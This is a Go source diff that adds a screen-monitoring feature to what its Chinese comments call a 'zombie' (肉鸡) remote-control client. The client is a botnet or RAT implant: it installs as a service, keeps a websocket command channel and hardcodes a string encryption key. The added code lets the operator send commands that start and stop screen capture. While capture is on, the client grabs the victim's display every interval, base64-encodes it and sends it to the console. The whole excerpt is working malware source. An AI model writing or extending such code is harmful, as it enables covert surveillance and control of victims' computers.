@@ -8,9 +8,11 @@ import (
 	"fmt"
 	"github.com/denisbrodbeck/machineid"
 	"github.com/kardianos/service"
+	"github.com/kbinani/screenshot"
 	"github.com/xxtea/xxtea-go/xxtea"
 	"golang.org/x/net/websocket"
 	"golang.org/x/text/encoding/simplifiedchinese"
+	"image/png"
 	"io"
 	"io/ioutil"
 	"net"
@@ -32,6 +34,8 @@ const (
 	DOWNLOAD_FILE = "2"   //下载文件到控制台
 	GET_HEART     = "10"  //肉鸡心跳（hostname信息）
 	SLEEP_ROUSE   = "50"  //休眠/唤醒肉鸡
+	ON_SCREEN     = "70"  //打开监控屏幕
+	OFF_SCREEN    = "71"  //关闭监控屏幕
 	KILL_ME       = "444" //杀了我
 
 	strKEY = "fhu84ygf8643" //字符串加密key
@@ -169,11 +173,54 @@ func begin() {
 				time.Sleep(time.Duration(errSleepTime) * time.Second)
 				conn.Close()
 				os.Exit(0)
+			} else if reqM.Name == ON_SCREEN { //打开监控屏幕
+				message.Name = ON_SCREEN
+				intervalTime, _ := strconv.Atoi(reqM.Msg) //截屏间隔时间毫秒
+				if intervalTime == 0 {                    //传错参数则纠正为1秒一次
+					intervalTime = 1000
+				}
+				ScreenFlag = true //打开开关
+				go onScreen(message, intervalTime)
+			} else if reqM.Name == OFF_SCREEN { //关闭监控屏幕
+				message.Name = OFF_SCREEN
+				ScreenFlag = false
 			}
 		}
 		time.Sleep(time.Duration(sleepTime) * time.Second) //休眠中
 	}
 }
+
+//监控屏幕=====================================================================================================
+var (
+	ScreenFlag = false
+	screenLock = false //保证单例
+) //默认关闭的开关
+
+func onScreen(message Message, intervalTime int) { //监控屏幕
+	if screenLock == true {
+		return
+	}
+	defer func() { screenLock = false }()
+	screenLock = true
+
+	for {
+		if ScreenFlag == false { //已关闭，需要退出
+			return
+		}
+		img, _ := screenshot.CaptureDisplay(0)
+		var b bytes.Buffer
+		_ = png.Encode(&b, img)
+		file64Str := base64.StdEncoding.EncodeToString(b.Bytes()) //base64
+		message.Msg = file64Str
+		err := sendMessage(message)
+		if err != nil { //连接出错
+			return
+		}
+		time.Sleep(time.Duration(intervalTime) * time.Millisecond) //间隔时间
+	}
+}
+
+//监控屏幕=====================================================================================================
 
 func heart() {
 wait:
